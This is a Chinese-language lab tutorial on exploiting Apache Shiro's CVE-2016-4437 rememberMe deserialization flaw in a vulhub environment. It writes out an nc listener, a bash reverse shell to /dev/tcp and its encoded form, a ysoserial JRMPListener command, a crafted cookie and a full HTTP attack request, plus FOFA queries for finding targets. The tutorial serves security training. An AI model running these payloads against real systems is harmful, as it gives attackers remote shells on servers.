# Apache Shiro介绍

 一款开源安全框架 

## 功能 

- 身份
- 验证 
- 授权 
- 会话管理 
- 加密 

## 官方sample 

https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4 

shiro-shiro-root-1.2.4\samples\web 

## 漏洞 

### CVE-2016-4437

2016年7月，1.2.4以下版本爆出RCE漏洞  

### 原因

登录的时候序列化保存了登录信息到 Cookie（序列化、AES加密、Base64） 

### 利用难点 

怎么获取到AES的key 

怎么构造一个序列化对象

# 漏洞原因分析 

## 登录 

![image-20221127191004831](https://image.201068.xyz/assets/image-20221127191004831.png)

## 验证

![image-20221127191018157](https://image.201068.xyz/assets/image-20221127191018157.png)

# 漏洞环境搭建 

## 本地启动环境（Windows）

IDEA，修改pom.xml 

配置tomcat服务器，启动 

http://localhost:8000/samples_web_war/ 

## Docker vulhub启动环境

 `cd /usr/local/soft/vulhub/shiro/CVE-2016-4437` 

`docker-compose up -d` 

http://192.168.31.76:8080 

勾选rememberme，使用 admin vulhub进行登录 

注意这里跟有没有账号密码，是不是登录成功了没有关系

# 利用工具和方式 

## 什么是JRMP协议 

Java Remote Method Protocol，Java远程方法 协议 

RMI使用了JRMP 

## ysoserial工具 

https://github.com/frohoff/ysoserial 

mvn package -D skipTests 

## 利用方式 

payloads/JRMPLIstener exploit/JRMPClient 

在漏洞服务器开启JRMP监听 



exploit/JRMPListener payloads/JRMPClient 

让漏洞服务器主动连接到恶意JRMP监听，发送 payload 

二次反序列化 

## 思路 

1. 先构建一个恶意命令，它的作用是让漏洞服务器连接到我们启动的JRMP服务器 
2. 把这个命令序列化、AES加密、base64编码（payload2），写入到Cookie，发给漏洞服务 器 
3. 漏洞服务器：base64解码、AES解密、反序列化，执行恶意命令，连接到JRMP服务器
4.  继续发送恶意payload1，利用CC等通用库的漏洞执行命令 

## 工具 

### ysoserial.jar 

序列化 

### python shiro.py 

- AES加密 
- base64编码 
- Cookie 

### Brup或者python 

发起HTTP请求



# 利用实现 

## 漏洞检测与发现

### fofa 

`header="rememberme=deleteMe"`

`header=" shiroCookie"` 

### 检测工具 

1. shiro_tool.jar 纯字符版 
2. ShiroExploitV2.51 
3. shiro_attack-v2.0.jar 

## 流程 

### kali监听7777 

`nc -lvp 7777` 

### 反弹连接命令准备 

`bash -i >& /dev/tcp/192.168.142.132/7777 0>&1` 

https://ares-x.com/tools/runtime-exec/ 



得到 

`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIv Nzc3NyAwPiYx}|{base64,-d}|{bash,-i}` 

### kali JRMPListener 

`cd /root/vuln/shiro` 

`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIv Nzc3NyAwPiYx}|{base64,-d}|{bash,-i}"` 

### python生成Cookie 

python3 shiro.py 192.168.142.132:8888 

可能需要 pip3 install pycrypto 

得到 

`rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==` 

### Burp抓包 

勾选remember me，火狐浏览器抓登录的包 

### payload 

```
POST /doLogin HTTP/1.1
Host: 192.168.142.128:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; 
Win64; x64; rv:98.0) Gecko/20100101
Firefox/98.0
Accept: text/html,application/xhtml+xml,
application/xml;q=0.9,image/avif,image/
webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=
0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-formurlencoded
Content-Length: 47
Origin: http://192.168.142.128:8080
Connection: close
Referer: http://192.168.142.128:8080/doLogin
Cookie: JSESSIONID=
BE2042921ED0A1E58436F6FBD5654581;
rememberMe=+
DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0m
jicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3EC
YQVLqKXaECtmKQhW91hbrn3XgJzn3XRUg
NEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+
cX7z74AwVAK2i0cwc/AmnVUV/
oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+
X1pZunOUFbquQqrBCW4D+hmUS+
g93brv5cpLDmR5DWkh7yqWyTXMWKzZqR
P0iW/
x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCg
Q7T8R7OJ66zQc92gx0kbInRJ/
QT3v19RF3Jn/q7fBGyX2/
LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VT
knFZqVj4gMsfGS2OA9NZ/
2jVIFhTdhvU3w==
Upgrade-Insecure-Requests: 1
username=admi&password=n&rememberme=
remember-me

```

# 修复与防御 

1. 升级Shiro 

2. 安全产品 

3. 防御工具库 

   https://github.com/ikkisoft/SerialKiller



